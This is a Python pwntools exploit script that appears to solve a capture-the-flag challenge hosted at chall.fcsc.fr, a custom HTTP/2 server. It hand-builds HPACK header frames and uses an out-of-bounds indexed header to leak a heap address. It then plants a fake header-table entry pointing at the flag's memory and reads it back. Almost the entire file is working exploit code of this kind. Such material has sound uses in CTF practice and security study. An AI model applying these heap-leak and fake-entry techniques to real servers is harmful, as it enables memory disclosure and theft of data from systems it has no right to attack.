from pwn import *
from time import sleep
import ctypes

context.terminal = ["gnome-terminal", "--window", "-x", "sh", "-c"]

# DEBUG = True
DEBUG = False
WAIT_TIME = 0.5

if DEBUG:
    # p = process("./compiled/http3.back")
    p = process("./compiled/http3")
    gdb.attach(p, gdbscript="b *main + 0x175\nc")
else:
    # p = remote("localhost", 4000)
    p = remote("chall.fcsc.fr", 2112)

sleep(0.5)


def pad_n(b, padding):
    return b + b"\x00" * (padding - (len(b) % padding))


class FrameHeader(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ("size", ctypes.ARRAY(ctypes.c_byte, 3)),
        ("type", ctypes.c_byte),
        ("flags", ctypes.c_uint8),
        ("id", ctypes.c_uint32),
    ]


class FRAME_TYPE:
    DATA = 0x00
    HEADERS = 0x01
    PRIORITY = 0x02
    RST_STREAM = 0x03
    SETTINGS = 0x04
    PUSH_PROMISE = 0x05
    PING = 0x06
    GOAWAY = 0x07
    WINDOW_UPDATE = 0x08
    CONTINUATION = 0x09


class SETTINGS_TYPE:
    HEADER_TABLE_SIZE = 1
    ENABLE_PUSH = 2
    MAX_CONCURRENT_STREAMS = 3
    INITIAL_WINDOW_SIZE = 4
    MAX_FRAME_SIZE = 5
    MAX_HEADER_LIST_SIZE = 6


class Settings(ctypes.BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("type", ctypes.c_uint16),
        ("value", ctypes.c_uint32),
    ]


def dump_struct(s):
    for field, typ in s._fields_:
        val = getattr(s, field)
        if field == "size" and type(val) == int:
            val = int.from_bytes(val)
        if type(val) == int:
            val = hex(val)
        print(field, val)


def send_preface():
    p.send("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    sleep(WAIT_TIME)


def send_header(header: FrameHeader):
    p.send(bytes(header))


def recv_frame():
    header = FrameHeader.from_buffer_copy(p.recv(ctypes.sizeof(FrameHeader)))
    data_size = int.from_bytes(header.size)
    data = b""
    if data_size != 0:
        data = p.recv(data_size)
    return header, data


def recv_message():
    ret = None
    header, data = recv_frame()

    if header.type == FRAME_TYPE.SETTINGS:
        ret = []
        for i in range(len(data) // (ctypes.sizeof(Settings))):
            ret.append(
                Settings.from_buffer_copy(
                    data[
                        i * ctypes.sizeof(Settings) : (i + 1) * ctypes.sizeof(Settings)
                    ]
                )
            )

    elif header.type == FRAME_TYPE.WINDOW_UPDATE:
        ret = data

    return (header.type, ret)


def var_int(n, pos):
    prefix = 8 - (pos % 8)
    # If it fits in prefix
    if n < (1 << prefix):
        return n.to_bytes(1)

    ret = b""

    # Else, skip prefix and adjust n
    prefix = 8 - (pos % 8)
    ret += ((1 << prefix) - 1).to_bytes(1)

    # Update n because the shift is f****d up
    n -= (1 << prefix) - 1

    # Remaining bytes
    while n != 0:
        chunk = n & 0x7F
        n >>= 7
        if n != 0:
            chunk |= 0x80
        ret += chunk.to_bytes(1)

    return ret


def var_string(string: bytes):
    # No huffman bit
    ret = var_int(len(string), 1)
    ret += string
    return ret


class HttpHeader:
    def __init__(self, typ, data):
        self.typ = typ
        self.data = data


class HttpHeaderIndexed(HttpHeader):
    def __init__(self, index):
        # Offset is 1
        index = bytearray(var_int(index, 1))
        # Set MSB to 1
        index[0] |= 0x80
        HttpHeader.__init__(self, 0, bytes(index))


class HttpHeaderLiteral(HttpHeader):
    def __init__(self, index, value, key=None):
        # Check correct arguments
        assert (index == 0 and key) or (index != 0 and not key)

        # Offset is 4
        data = bytearray(var_int(index, 4))
        data[0] |= 0x10

        # If key, send it
        if key:
            data += var_string(key)

        data += var_string(value)
        HttpHeader.__init__(self, 3, bytes(data))


class HttpHeaderLiteralUpdate(HttpHeader):
    def __init__(self, index, value, key=None):
        # Check correct arguments
        assert (index == 0 and key) or (index != 0 and not key)

        # Offset is 2
        data = bytearray(var_int(index, 2))
        data[0] |= 0x40

        # If key, send it
        if key:
            data += var_string(key)

        data += var_string(value)
        HttpHeader.__init__(self, 4, bytes(data))


def send_http(httpheader: list[HttpHeader]):
    data = b""
    for h in httpheader:
        data += h.data
    send_header(
        FrameHeader(
            (ctypes.c_byte * 3)(*list(len(data).to_bytes(3))), FRAME_TYPE.HEADERS, 0, 0
        )
    )
    p.send(data)


# Init handshake
send_preface()

# Receive settings
print("\nSettings: \n")
_, settings = recv_message()
for s in settings:
    dump_struct(s)
    print("")

# Receive window update
_, window_update = recv_message()
print(f"Window update: {window_update}\n")

# Send settings
send_header(
    FrameHeader((ctypes.c_byte * 3)(*list(0x00.to_bytes(3))), FRAME_TYPE.SETTINGS, 0, 0)
)

# Receive settings acknowledgement
_, data = recv_message()
assert len(data) == 0
print("Got ACK\n")

send_http([HttpHeaderLiteral(0, b"osef", key=b"a" * 0x20)])
sleep(WAIT_TIME)
print(p.recv())

send_http([HttpHeaderLiteral(0, b"osef2", key=b"a" * 0x420)])
sleep(WAIT_TIME)
print(p.recv())

send_http([HttpHeaderIndexed(1 + 61 + 0x1000 + 6)])
sleep(WAIT_TIME)
p.recvuntil(b"Invalid header name: ")
top_chunk_addr = u64(pad_n(p.recv(), 8)) - 0x1000
print(f"Leaked top chunk address: 0x{top_chunk_addr:016x}")

# Compute other heap addresses
header_array_addr = top_chunk_addr - 0x20960
print(f"Header array address should be at 0x{header_array_addr:016x}")
flag_addr = top_chunk_addr - 0x20A10
print(f"Flag should be at 0x{flag_addr:016x}")

# Store fake key-value association somewhere in memory
fake_header = p64(0x46 + 1) + p64(flag_addr) + b"\x00" * 0x10
send_http([HttpHeaderLiteralUpdate(0, b"dontcare", key=b"a" * 0x10 + fake_header)])
sleep(WAIT_TIME)
print(p.recv())

send_http([HttpHeaderIndexed(1 + 61 + 0x1000 + 0xF)])
sleep(WAIT_TIME)
print(p.recv())

p.interactive()
